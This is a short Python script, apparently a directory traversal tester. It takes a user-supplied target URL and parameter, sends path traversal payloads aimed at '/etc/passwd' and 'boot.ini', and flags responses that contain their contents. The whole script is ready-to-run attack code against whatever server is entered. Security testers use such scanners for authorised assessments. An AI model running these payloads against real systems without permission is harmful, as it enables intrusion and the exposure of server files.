import requests # type: ignore

def directory_traversal_tester(target, param):
    payloads = ["../../etc/passwd", "../../../boot.ini"]
    for payload in payloads:
        url = f"{target}?{param}={payload}"
        response = requests.get(url)
        if "root" in response.text or "[boot loader]" in response.text:
            print(f"Potential Directory Traversal found: {url}")

target = input("Enter target URL (e.g., http://example.com/file): ")
param = input("Enter parameter name (e.g., path): ")
directory_traversal_tester(target, param)
